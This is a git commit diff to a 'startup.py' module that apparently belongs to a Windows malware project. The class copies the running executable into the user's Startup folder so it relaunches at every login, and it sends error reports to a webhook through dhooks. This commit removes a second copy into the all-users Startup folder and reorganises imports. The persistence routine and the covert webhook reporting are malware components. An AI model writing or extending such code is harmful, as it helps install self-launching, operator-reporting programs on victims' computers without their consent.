8810b6a4416a856b8b62b951a268cbd82a265a8d
gumbobr0t <96620548+gumbobr0t@users.noreply.github.com>
2023-08-06 17:13:50 +0200

    Update startup.py

--- components/source/startup.py
+++ components/source/startup.py
@@ -1,15 +1,14 @@
+import os
+from dhooks import Embed
+from config import Config
+from __webhook import _WebhookX
+
 class Startup:
     def __init__(self):
-        import os
         self.roaming = os.getenv("appdata")
         self.startup_loc = os.path.join(self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-        self.common_startup_loc = os.path.join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs",
-                                               "StartUp")
 
     def send_error_notification(self, exception):
-        from dhooks import Embed
-        from config import Config
-        from __webhook import _WebhookX
         cc = Config()
         webx = _WebhookX().get_object()
 
@@ -31,10 +30,5 @@ class Startup:
             from sys import argv
             import shutil
             shutil.copy(argv[0], self.startup_loc)
-        except Exception as e:
-            self.send_error_notification(e)
-
-        try:
-            shutil.copy(argv[0], self.common_startup_loc)
         except Exception as e:
             self.send_error_notification(e)
